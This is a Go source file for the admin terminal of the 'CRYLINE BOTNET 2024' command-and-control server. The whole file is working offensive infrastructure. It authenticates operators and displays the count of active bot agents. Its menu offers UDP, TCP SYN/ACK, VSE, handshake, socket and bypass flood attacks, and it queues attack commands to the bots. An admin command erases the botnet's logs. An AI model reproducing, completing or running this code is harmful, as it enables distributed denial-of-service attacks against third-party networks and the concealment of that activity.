/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "fmt"
    "net"
    "time"
)

type Admin struct {
    _CONNECTION net.Conn
}

func __CREATE_NEW_ADMIN(_CONNECTION net.Conn) *Admin {
    return &Admin{_CONNECTION}
}

func (_THIS *Admin) Handle() {
    _THIS._CONNECTION.Write([]byte("\033[?1049h"))
    _THIS._CONNECTION.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        _THIS._CONNECTION.Write([]byte("\033[?1049l"))
    }()

    _THIS._CONNECTION.Write([]byte("\033[2J\033[1H\x1b[0m"))                                 
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m░█████╗░██████╗░██╗░░░██╗██╗░░░░░██╗███╗░░██╗███████╗\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██║████╗░██║██╔════╝\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m██║░░╚═╝██████╔╝░╚████╔╝░██║░░░░░██║██╔██╗██║█████╗░░\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m██║░░██╗██╔══██╗░░╚██╔╝░░██║░░░░░██║██║╚████║██╔══╝░░\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m╚█████╔╝██║░░██║░░░██║░░░███████╗██║██║░╚███║███████╗\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;34m░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚═╝░░╚══╝╚══════╝\r\n"))
    _THIS._CONNECTION.Write([]byte("\r\n\r\n"))

    _THIS._CONNECTION.SetDeadline(time.Now().Add(60 * time.Second))

    _THIS._CONNECTION.Write([]byte("\033[34;1m[USERNAME]> \033[0m"))
    
    _USER_NAME, _GET_ERROR := _THIS.__READ_LINE(false)

    if _GET_ERROR != nil {
        return
    }

    _THIS._CONNECTION.SetDeadline(time.Now().Add(60 * time.Second))

    _THIS._CONNECTION.Write([]byte("\033[34;1m[PASSWORD]> \033[0m"))

    _PASSWORD, _GET_ERROR := _THIS.__READ_LINE(true)

    if _GET_ERROR != nil {
        return
    }

    _THIS._CONNECTION.SetDeadline(time.Now().Add(120 * time.Second))

    _THIS._CONNECTION.Write([]byte("\r\n"))

    _SPIN_BUFFER := []byte{'-', '\\', '|', '/'}

    for _GET_COUNTER := 0; _GET_COUNTER < 15; _GET_COUNTER++ {
        _THIS._CONNECTION.Write(append([]byte("\r\033[34;1m[STATUS]> Checking access...\033[34m"), _SPIN_BUFFER[_GET_COUNTER % len(_SPIN_BUFFER)]))
        
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    _THIS._CONNECTION.Write([]byte("\r\n"))

    var _LOGGED_IN bool

    var _USER_INFO AccountInfo

    if _LOGGED_IN, _USER_INFO = __DATABASE.__LOGIN(_USER_NAME, _PASSWORD); !_LOGGED_IN {
        _THIS._CONNECTION.Write([]byte("\033[31m[STATUS]> Access denied!\033[0m"))

        _BUFFER := make([]byte, 1)

        _THIS._CONNECTION.Read(_BUFFER)

        return
    }

    time.Sleep(1 * time.Second)

    _THIS._CONNECTION.Write([]byte("\033[32m[STATUS]> Access allowed!\033[0m"))

    time.Sleep(1 * time.Second)

    go func() {
        _GET_COUNTER := 0

        for {
            var _GET_BOT_COUNTER int

            if __AGENT_LIST.__COUNT() > _USER_INFO._MAX_BOTNET_AGENTS && _USER_INFO._MAX_BOTNET_AGENTS != -1 {
                _GET_BOT_COUNTER = _USER_INFO._MAX_BOTNET_AGENTS
            } else {
                _GET_BOT_COUNTER = __AGENT_LIST.__COUNT()
            }

            time.Sleep(time.Second)

            if _, _GET_ERROR := _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\033]0;Active botnet agents: %d\007", _GET_BOT_COUNTER))); _GET_ERROR != nil {
                _THIS._CONNECTION.Close()
                break
            }

            _GET_COUNTER++

            if _GET_COUNTER % 60 == 0 {
                _THIS._CONNECTION.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    _THIS._CONNECTION.Write([]byte("\033[2J\033[1H\x1b[0m"))                                 
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m░█████╗░██████╗░██╗░░░██╗██╗░░░░░██╗███╗░░██╗███████╗\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██║████╗░██║██╔════╝\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m██║░░╚═╝██████╔╝░╚████╔╝░██║░░░░░██║██╔██╗██║█████╗░░\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m██║░░██╗██╔══██╗░░╚██╔╝░░██║░░░░░██║██║╚████║██╔══╝░░\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m╚█████╔╝██║░░██║░░░██║░░░███████╗██║██║░╚███║███████╗\r\n"))
    _THIS._CONNECTION.Write([]byte("\x1b[1;32m░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚═╝░░╚══╝╚══════╝\r\n"))
    _THIS._CONNECTION.Write([]byte("\r\n\r\n"))

    for {
        var _AGENT_CATEGORY string

        var _AGENT_COUNTER int

        _THIS._CONNECTION.Write([]byte("\033[32;1m" + _USER_NAME + "@cryline> \033[0m"))

        _COMMAND, _GET_ERROR := _THIS.__READ_LINE(false)

        if _COMMAND == "" {
            continue
        }

        _AGENT_COUNTER = _USER_INFO._MAX_BOTNET_AGENTS

        if _GET_ERROR != nil || _COMMAND == "cls" || _COMMAND == "clear" || _COMMAND == "CLS" || _COMMAND == "CLEAR" || _COMMAND == "/cls" || _COMMAND == "/clear" || _COMMAND == "/CLS" || _COMMAND == "/CLEAR" {
            _THIS._CONNECTION.Write([]byte("\033[2J\033[1H\x1b[0m"))                                 
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m░█████╗░██████╗░██╗░░░██╗██╗░░░░░██╗███╗░░██╗███████╗\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██║████╗░██║██╔════╝\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m██║░░╚═╝██████╔╝░╚████╔╝░██║░░░░░██║██╔██╗██║█████╗░░\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m██║░░██╗██╔══██╗░░╚██╔╝░░██║░░░░░██║██║╚████║██╔══╝░░\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m╚█████╔╝██║░░██║░░░██║░░░███████╗██║██║░╚███║███████╗\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚═╝░░╚══╝╚══════╝\r\n"))
            _THIS._CONNECTION.Write([]byte("\r\n\r\n"))

            continue
        }

        if _COMMAND == "help" || _COMMAND == "?" || _COMMAND == "HELP" || _COMMAND == "/help" || _COMMAND == "/?" || _COMMAND == "/HELP" {
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m[=======================]> [ATTACKS] <[======================]\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/udp \x1b[1;37m- UDP Flooding of datagram UDP with less PPS speed\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/tcpsyn \x1b[1;37m- TCP Flooding with SYN flag\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/tcpack \x1b[1;37m- TCP Flooding with ACK flag\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/vse \x1b[1;37m- UDP Flooding with HEX data and random IP header fragments\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/udpplain \x1b[1;37m- UDP Flood with less options of optimized for high GB/s\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/tcpstomp \x1b[1;37m- TCP Handshake Flood\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/socket \x1b[1;37m- High socket/s Flood\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/udpbypass \x1b[1;37m- UDP Flooding optimized for bypassing\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m[============================================================]\r\n"))
            _THIS._CONNECTION.Write([]byte("\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m[=======================]> [CONTROL] <[======================]\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/clearlogs \x1b[1;37m- Clear botnet logs\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/clear \x1b[1;37m- Clear text in C&C terminal\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/agents \x1b[1;37m- Show active botnet agents\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m/exit \x1b[1;37m- Logout from account\r\n"))
            _THIS._CONNECTION.Write([]byte("\x1b[1;32m[============================================================]\r\n"))
            _THIS._CONNECTION.Write([]byte("\r\n"))

            continue
        }

         if _GET_ERROR != nil || _COMMAND == "quit" || _COMMAND == "/quit" || _COMMAND == "/q" || _COMMAND == "/logout" || _COMMAND == "/exit" || _COMMAND == "/LOGOUT" || _COMMAND == "/EXIT" || _COMMAND == "logout" || _COMMAND == "exit" || _COMMAND == "LOGOUT" || _COMMAND == "EXIT"{
            return
        }

        if _USER_INFO._ADMIN_USER == 1 && _COMMAND == "/clearlogs"  {

            _THIS._CONNECTION.Write([]byte("\033[1;91m[CONFIRM]> Are you sure do you want to delete botnet logs?\033[1;33m{y/n}> \033[0m"))

            _CONFIRM, _GET_ERROR := _THIS.__READ_LINE(false)

            if _GET_ERROR != nil {
                return
            }

            if _CONFIRM != "y" {
                continue
            }

            if !__DATABASE.__CLEAN_LOGS() {
                _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\033[01;31m[ERROR]> Failed to clearing botnet logs!\r\n")))
            } else {
                _THIS._CONNECTION.Write([]byte("\033[1;92m[SUCCESS]> Botnet logs has been cleaned!\r\n"))

                fmt.Println("\033[1;91m[\033[1;92m[SERVER LOGS]>\033[1;91m] Botnet logs has been cleaned by \033[1;92m" + _USER_NAME + " \033[1;91m!\r\n")
            }
            continue 
        }

        if _USER_INFO._ADMIN_USER == 1 && _COMMAND == "/agents" {
            _AGENT_COUNTER = __AGENT_LIST.__COUNT()

            _M_COUNTER := __AGENT_LIST.__DESTRIBUTION()

            for _K_COUNTER, GET_THIS_VALUE := range _M_COUNTER {
                _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[1;37m[TOTAL AGENTS]> %d\033[0m\r\n", _K_COUNTER, GET_THIS_VALUE)))
            }

            continue
        }

        _ATTACK, _GET_ERROR := __GENERATE_NEW_ATTACK(_COMMAND, _USER_INFO._ADMIN_USER)

        if _GET_ERROR != nil {
            _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", _GET_ERROR.Error())))
        } else {
            _BUFFER, _GET_ERROR := _ATTACK.Build()

            if _GET_ERROR != nil {
                _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", _GET_ERROR.Error())))
            } else {
                if _CAN, _GET_ERROR := __DATABASE.__ATTACK_LAUNCH(_USER_NAME, _ATTACK._DURATION, _COMMAND, _AGENT_COUNTER, 0); !_CAN {
                    _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", _GET_ERROR.Error())))
                } else if !__DATABASE.__CHECK_WHITE_LISTED_TARGETS(_ATTACK) {

                    _THIS._CONNECTION.Write([]byte(fmt.Sprintf("\x1b[1;37m[BOTNET]> Relay attack command to \x1b[1;31m%d \x1b[1;37mbotnet agents!\r\n", __AGENT_LIST.__COUNT())))

                    __AGENT_LIST.__QUEUE_BUFFER(_BUFFER, _AGENT_COUNTER, _AGENT_CATEGORY)

                } else {
                    fmt.Println("[ERROR]> Blocked attack by " + _USER_NAME + " to whitelisted prefix!")
                }
            }
        }
    }
}

func (_THIS *Admin) __READ_LINE(_MASKED bool) (string, error) {
    _BUFFER := make([]byte, 1024)

    _GET_BUFFER_OFFSET := 0

    for {
        _SETTER, _GET_ERROR := _THIS._CONNECTION.Read(_BUFFER[_GET_BUFFER_OFFSET:_GET_BUFFER_OFFSET+1])

        if _GET_ERROR != nil || _SETTER != 1 {
            return "", _GET_ERROR
        }

        if _BUFFER[_GET_BUFFER_OFFSET] == '\xFF' {
            _SETTER, _GET_ERROR := _THIS._CONNECTION.Read(_BUFFER[_GET_BUFFER_OFFSET:_GET_BUFFER_OFFSET+2])

            if _GET_ERROR != nil || _SETTER != 2 {
                return "", _GET_ERROR
            }

            _GET_BUFFER_OFFSET--

        } else if _BUFFER[_GET_BUFFER_OFFSET] == '\x7F' || _BUFFER[_GET_BUFFER_OFFSET] == '\x08' {
            if _GET_BUFFER_OFFSET > 0 {
                _THIS._CONNECTION.Write([]byte(string(_BUFFER[_GET_BUFFER_OFFSET])))

                _GET_BUFFER_OFFSET--
            }

            _GET_BUFFER_OFFSET--

        } else if _BUFFER[_GET_BUFFER_OFFSET] == '\r' || _BUFFER[_GET_BUFFER_OFFSET] == '\t' || _BUFFER[_GET_BUFFER_OFFSET] == '\x09' {
            _GET_BUFFER_OFFSET--

        } else if _BUFFER[_GET_BUFFER_OFFSET] == '\n' || _BUFFER[_GET_BUFFER_OFFSET] == '\x00' {
            _THIS._CONNECTION.Write([]byte("\r\n"))

            return string(_BUFFER[:_GET_BUFFER_OFFSET]), nil

        } else if _BUFFER[_GET_BUFFER_OFFSET] == 0x03 {
            _THIS._CONNECTION.Write([]byte("^C\r\n"))

            return "", nil

        } else {
            if _BUFFER[_GET_BUFFER_OFFSET] == '\x1B' {
                _BUFFER[_GET_BUFFER_OFFSET] = '^';

                _THIS._CONNECTION.Write([]byte(string(_BUFFER[_GET_BUFFER_OFFSET])))

                _GET_BUFFER_OFFSET++;

                _BUFFER[_GET_BUFFER_OFFSET] = '[';

                _THIS._CONNECTION.Write([]byte(string(_BUFFER[_GET_BUFFER_OFFSET])))

            } else if _MASKED {
                _THIS._CONNECTION.Write([]byte("*"))
            } else {
                _THIS._CONNECTION.Write([]byte(string(_BUFFER[_GET_BUFFER_OFFSET])))
            }
        }
        _GET_BUFFER_OFFSET++
    }
    return string(_BUFFER), nil
}
